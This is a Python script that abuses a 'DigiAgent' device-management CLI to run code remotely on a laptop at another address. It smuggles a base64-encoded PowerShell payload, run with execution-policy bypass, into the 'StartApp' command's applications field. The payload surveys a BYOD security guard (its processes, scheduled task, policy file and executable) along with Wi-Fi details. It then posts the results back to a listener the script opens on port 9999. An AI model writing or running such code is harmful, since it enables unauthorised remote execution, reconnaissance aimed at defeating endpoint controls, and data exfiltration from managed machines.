from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import base64
import subprocess
import threading
import time

received_body = None

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global received_body
        length = int(self.headers.get('Content-Length', 0))
        received_body = self.rfile.read(length).decode('utf-8', errors='ignore')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

server = HTTPServer(('0.0.0.0', 9999), Handler)

def run_server():
    server.handle_request()

t = threading.Thread(target=run_server)
t.start()
time.sleep(0.5)

ps_code = """
$p = Get-Process -Name "*Guard*", "*Synapse*", "*Tailscale*", "*Digi*" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, Path
$sch = schtasks /query /tn SynapseBYODGuard /fo list 2>&1
$pol = if (Test-Path "C:\\ProgramData\\DigiAgent\\byod_policy.json") { Get-Content "C:\\ProgramData\\DigiAgent\\byod_policy.json" -Raw } else { "No byod_policy.json" }
$wlan = netsh wlan show interfaces 2>&1
$file = if (Test-Path "C:\\Program Files\\DigiAgent\\SynapseBYODGuard.exe") { Get-Item "C:\\Program Files\\DigiAgent\\SynapseBYODGuard.exe" | Select-Object Length, LastWriteTime } else { "File not found" }

$out = @{
    Processes = $p
    ScheduledTask = $sch
    Policy = $pol
    Wlan = ($wlan -join "`n")
    File = $file
} | ConvertTo-Json -Depth 4

try {
    Invoke-RestMethod -Uri "http://100.99.161.43:9999" -Method Post -Body $out -TimeoutSec 5
} catch {
    try {
        Invoke-RestMethod -Uri "http://192.168.1.150:9999" -Method Post -Body $out -TimeoutSec 5
    } catch {
        Set-Content -Path "C:\ProgramData\DigiAgent\probe_diag.txt" -Value ($out + "`n" + $_.Exception.ToString())
    }
}
"""

b64 = base64.b64encode(ps_code.encode('utf-16le')).decode()
cmd = f"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {b64}"
payload = json.dumps({"applications": cmd})

res = subprocess.run([
    r"C:\Program Files\DigiAgent\digiagent-cli.exe",
    "feature", "start", "100.119.119.73", "StartApp", payload
], capture_output=True, text=True)

print("CLI returncode:", res.returncode)
print("CLI stdout:", res.stdout)

t.join(15.0)
print("--- DIAGNOSTICS REPORT FROM LAPTOP ---")
print(received_body)
